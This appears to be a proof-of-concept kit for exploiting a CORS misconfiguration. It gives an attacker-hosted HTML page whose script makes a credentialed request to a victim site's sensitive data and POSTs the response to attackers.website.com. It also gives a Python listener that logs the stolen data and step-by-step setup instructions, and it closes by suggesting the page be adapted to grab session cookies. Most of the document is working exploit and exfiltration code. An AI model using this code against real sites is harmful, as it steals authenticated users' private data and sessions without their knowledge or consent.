Attack Code running on attacker website
===========================================
Save following code below to a directory and name it "index.html"
Start python Simple Web server in the same directory as "index.html" is located
Note the port number 88 is being used as two servers are being run on the same computer to avoid socket errors by using port 80 twice.

python -m SimpleHTTPServer 88 

BEGIN "index.html"
===========================================
<!DOCTYPE html>
<html>
<body>
<center>
<h2>CORS POC Exploit</h2>
<h3>Extract Sensitive Data</h3>
 
<div id="demo">
<button type="button" onclick="cors()">Exploit</button>
</div>
 
<script>
function cors() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
	recordThis(this.responseText);
      document.getElementById("demo").innerHTML = alert(this.responseText);
    }
  };
  xhttp.open("GET", "https://vulnerble.victim.com/path/to/sensitive/data", true);
  xhttp.withCredentials = true;
  xhttp.send();
}
function recordThis(textToStore) {
// TODO: Call webservice on your own server to POST data to
  var xhttp = new XMLHttpRequest();
  xhttp.open("POST","http://attackers.website.com/",true);
  xhttp.send(JSON.stringify({ data: textToStore }));
}

</script>
 
</body>
</html>
===========================================
===========================================


Python simple server code that "Reflects the requests from HTTP methods GET, POST, PUT, and DELETE"
===========================================
Save the code below to a file called "python-post.py"
Start the "listening" server that will collect the POST data as follows
python ./python-post.py
Note - the port can be changed --- look at the code and modify as needed.


BEGIN python server code that "Reflects the requests from HTTP methods GET, POST, PUT, and DELETE"
===========================================
#!/usr/bin/env python
# Change line 47 to configure port
# Reflects the requests from HTTP methods GET, POST, PUT, and DELETE
# Written by Nathan Hamiel (2010)

from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
from optparse import OptionParser

class RequestHandler(BaseHTTPRequestHandler):
    
    def do_GET(self):
        
        request_path = self.path
        
        print("\n----- Request Start ----->\n")
        print(request_path)
        print(self.headers)
        print("<----- Request End -----\n")
        
        self.send_response(200)
        self.send_header("Set-Cookie", "foo=bar")
        
    def do_POST(self):
        
        request_path = self.path
        
        print("\n----- Request Start ----->\n")
        print(request_path)
        
        request_headers = self.headers
        content_length = request_headers.getheaders('content-length')
        length = int(content_length[0]) if content_length else 0
        
        print(request_headers)
        print(self.rfile.read(length))
        print("<----- Request End -----\n")
        
        self.send_response(200)
    
    do_PUT = do_POST
    do_DELETE = do_GET
        
def main():
    port = 80
    print('Listening on localhost:%s' % port)
    server = HTTPServer(('', port), RequestHandler)
    server.serve_forever()

        
if __name__ == "__main__":
    parser = OptionParser()
    parser.usage = ("Creates an http-server that will echo out any GET or POST parameters\n"
                    "Run:\n\n"
                    "   reflect")
    (options, args) = parser.parse_args()
    
    main()
===========================================

To simulate, an authenticated user to the vulnerable website would visit the first attacking website (in this case the one running on port 88)
When the user clicks on the "Exploit" button the victim will pull data from the vulnerable website via the CORS "trust" and the data will be POSTed to the second website running on port 80.

http://attackers.website.com:88/index.html

Watch the console screen on the second website running on port 80 for the data to be logged.

May be able to modify "index.html" to get session cookies... look into this.


